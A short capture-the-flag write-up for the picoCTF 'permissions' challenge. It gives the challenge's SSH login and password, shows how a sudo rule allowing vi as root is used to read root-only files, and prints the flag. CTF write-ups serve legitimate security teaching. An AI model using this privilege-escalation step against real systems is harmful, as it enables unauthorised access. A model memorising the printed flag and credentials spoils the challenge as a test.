# permissions

## Challenge description
Can you read files in the root file? The system admin has provisioned an account for you on the main server: ssh -p 52757 picoplayer@saturn.picoctf.net Password: dLAqMvm7xv Can you login and read the root file?

## Solution
After connecting to the server, you can use `sudo -l` to see which programs you are allowed to run with `sudo`<br>
The output is:
```
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```
We can run vim as root, which lets us view any files and folders.<br>
Running `sudo /usr/bin/vi /root` shows us a file called .flag.txt<br>
Opening the file shows the flag

## Flag
`picoCTF{uS1ng_v1m_3dit0r_021d10ab}`
